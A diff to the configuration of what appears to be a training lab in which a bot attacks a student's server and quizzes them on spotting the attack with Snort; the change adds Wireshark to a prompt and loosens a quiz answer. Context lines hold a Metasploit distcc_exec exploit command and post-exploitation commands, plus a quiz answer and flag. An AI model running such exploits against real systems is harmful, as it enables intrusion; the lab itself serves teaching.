@@ -208,7 +208,7 @@ I'm about to attack your system, use Snort to detect the method of attack.
 		<get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST <%= $web_server_ip %>; exploit"</get_shell>
 		<post_command>whoami >> out;id >> out;touch hackerbotwashere; echo $?</post_command>
 
-		<prompt>Your webserver is about to be scanned/attacked. Make sure you are using Snort to monitor your network... This make take a while (a few minutes) please be patient.</prompt>
+		<prompt>Your webserver is about to be scanned/attacked. Make sure you are using Snort and Wireshark to monitor your network... This make take a while (a few minutes) please be patient.</prompt>
 
 		<condition>
 			<output_matches>0</output_matches>
@@ -253,7 +253,7 @@ I'm about to attack your system, use Snort to detect the method of attack.
 
 		<quiz>
 			<question>What kind of scan was that?</question>
-			<answer>^Xmas$</answer>
+			<answer>Xmas</answer>
 			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
 			<trigger_next_attack />
 		</quiz>
